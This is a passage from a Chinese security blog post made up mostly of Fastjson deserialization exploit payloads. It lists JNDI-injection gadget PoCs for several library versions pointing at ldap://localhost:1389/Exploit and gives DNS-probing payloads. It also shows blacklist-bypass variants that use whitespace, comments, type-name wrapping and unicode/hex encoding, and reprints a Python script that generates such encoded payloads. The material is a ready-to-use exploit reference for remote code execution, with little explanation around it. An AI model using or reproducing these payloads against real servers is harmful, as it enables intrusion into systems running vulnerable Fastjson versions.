+<pre><code class="java">&#39;&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.fastjson.demo.poc.poc&quot;,&quot;s&quot;:&quot;calc&quot;&#125;&#39;
+</code></pre>
+<p>具体可看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/sdihvai/article/details/111871147">https://blog.csdn.net/sdihvai/article/details/111871147</a></p>
+<p>从网上看到1.2.80的POC：</p>
+<pre><code class="json">&#123;
+    &quot;@type&quot;: &quot;java.lang.Exception&quot;,
+    &quot;@type&quot;: &quot;com.example.fastjson.poc20220523.Poc20220523&quot;,
+    &quot;name&quot;: &quot;calc&quot;
+&#125;
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://github.com/YoungBear/FastjsonPoc">https://github.com/YoungBear/FastjsonPoc</a></p>
+<h1 id="0x12-其他Gadget补充"><a href="#0x12-其他Gadget补充" class="headerlink" title="0x12 其他Gadget补充"></a>0x12 其他Gadget补充</h1><p>这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。</p>
+<p>1.2.59</p>
+<p>com.zaxxer.hikari.HikariConfig类PoC：</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
+或
+&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
+</code></pre>
+<h2 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h2><p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;Object&quot;:&quot;a&quot;&#125;
+</code></pre>
+<h2 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h2><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;
+</code></pre>
+<h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
+或
+&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;
+</code></pre>
+<p>com.caucho.config.types.ResourceRef类PoC：</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;
+</code></pre>
+<h2 id="未知版本"><a href="#未知版本" class="headerlink" title="未知版本"></a>未知版本</h2><p>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: &#123;&quot;$ref&quot;:&quot;$.transactionManager&quot;&#125;&#125;
+</code></pre>
+<p>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: &#123;&quot;$ref&quot;:&quot;$.transactionManager&quot;&#125;&#125;
+</code></pre>
+<h2 id="DNS探测"><a href="#DNS探测" class="headerlink" title="DNS探测"></a>DNS探测</h2><pre><code class="java">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
+
+&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
+
+&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
+
+&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;
+
+&#123;&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;:"x"&#125;
+
+&#123;"@type":"com.alibaba.fastjson.JSONObject",&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;&#125;&quot;&quot;&#125;
+
+Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]
+
+Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;
+
+&#123;&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;:0
+
+
+https://github.com/alibaba/fastjson/issues/3841
+最新版 1.2.76 开启safeMode
+&#123;"ss":&#123;"@type":"com.alibaba.fastjson.JSONObject",&#123;"@type":"java.net.URL","val":"http://xxx.dnslog.cn"&#125;&#125;&quot;&quot;&#125;,&#125;
+</code></pre>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>Fastjson默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等，同时还会自动将键与值进行unicode与十六进制解码</p>
+<pre><code class="json">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;
+
+&#123;  &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;
+
+&#123;/*s6*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;
+
+&#123;\n&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;
+
+&#123;&quot;@type&quot;\b:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;
+
+&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;  &#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://10.251.0.111:9999&quot;,&quot;autoCommit&quot;:true&#125;
+</code></pre>
+<pre><code class="json">&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;, &quot;rand2&quot;: &#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\u004c\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b\u003b&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\x4c\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b\x3b&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;, &quot;rand2&quot;: &#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;&#125;
+
+&#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;, &quot;rand2&quot;: &#123;&quot;rand1&quot;: &#123;&quot;@type&quot;: &quot;\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true&#125;&#125;&#125;
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/#fastjson">脚本将payload转换十六进制、unicode</a></p>
+<pre><code class="python">#!usr/bin/env python  
+# -*- coding:utf-8 -*-
+&quot;&quot;&quot; 
+@author: longofo
+@file: fastjson_fuzz.py 
+@time: 2020/05/07 
+&quot;&quot;&quot;
+import json
+from json import JSONDecodeError
+
+
+class FastJsonPayload:
+    def __init__(self, base_payload):
+        try:
+            json.loads(base_payload)
+        except JSONDecodeError as ex:
+            raise ex
+        self.base_payload = base_payload
+
+    def gen_common(self, payload, func):
+        tmp_payload = json.loads(payload)
+        dct_objs = [tmp_payload]
+
+        while len(dct_objs) &gt; 0:
+            tmp_objs = []
+            for dct_obj in dct_objs:
+                for key in dct_obj:
+                    if key == &quot;@type&quot;:
+                        dct_obj[key] = func(dct_obj[key])
+
+                    if type(dct_obj[key]) == dict:
+                        tmp_objs.append(dct_obj[key])
+            dct_objs = tmp_objs
+        return json.dumps(tmp_payload)
+
+    # 对@type的value增加L开头，;结尾的payload
+    def gen_payload1(self, payload: str):
+        return self.gen_common(payload, lambda v: &quot;L&quot; + v + &quot;;&quot;)
+
+    # 对@type的value增加LL开头，;;结尾的payload
+    def gen_payload2(self, payload: str):
+        return self.gen_common(payload, lambda v: &quot;LL&quot; + v + &quot;;;&quot;)
+
+    # 对@type的value进行\u
+    def gen_payload3(self, payload: str):
+        return self.gen_common(payload,
+                               lambda v: &#39;&#39;.join(&#39;\\u&#123;:04x&#125;&#39;.format(c) for c in v.encode())).replace(&quot;\\\\&quot;, &quot;\\&quot;)
+
+    # 对@type的value进行\x
+    def gen_payload4(self, payload: str):
+        return self.gen_common(payload,
+                               lambda v: &#39;&#39;.join(&#39;\\x&#123;:02x&#125;&#39;.format(c) for c in v.encode())).replace(&quot;\\\\&quot;, &quot;\\&quot;)
+
+    # 生成cache绕过payload
+    def gen_payload5(self, payload: str):
+        cache_payload = &#123;
+            &quot;rand1&quot;: &#123;
+                &quot;@type&quot;: &quot;java.lang.Class&quot;,
+                &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+            &#125;
+        &#125;
+        cache_payload[&quot;rand2&quot;] = json.loads(payload)
+        return json.dumps(cache_payload)
+
+    def gen(self):
+        payloads = []
+
+        payload1 = self.gen_payload1(self.base_payload)
+        yield payload1
+
+        payload2 = self.gen_payload2(self.base_payload)
+        yield payload2
+
+        payload3 = self.gen_payload3(self.base_payload)
+        yield payload3
+
+        payload4 = self.gen_payload4(self.base_payload)
+        yield payload4
+
+        payload5 = self.gen_payload5(self.base_payload)
+        yield payload5
+
+        payloads.append(payload1)
+        payloads.append(payload2)
+        payloads.append(payload5)
+
+        for payload in payloads:
+            yield self.gen_payload3(payload)
+            yield self.gen_payload4(payload)
+
+
+if __name__ == &#39;__main__&#39;:
+    fjp = FastJsonPayload(&#39;&#39;&#39;&#123;
+  &quot;rand1&quot;: &#123;
+    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,
+    &quot;autoCommit&quot;: true
+  &#125;
+&#125;&#39;&#39;&#39;)
+
+    for payload in fjp.gen():
+        print(payload)
+        print()
+</code></pre>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/#fastjson">https://paper.seebug.org/1192/#fastjson</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/994/#0x01-fastjson">https://paper.seebug.org/994/#0x01-fastjson</a></p>
+<p><a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#fastjson-lt-1-2-68">https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#fastjson-lt-1-2-68</a></p>
+</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/06/11/%E5%86%85%E7%BD%91/Exchange%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">prev</a><a class="next" href="/2022/06/06/CobaltStrike%E4%B8%8A%E7%BA%BF%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>
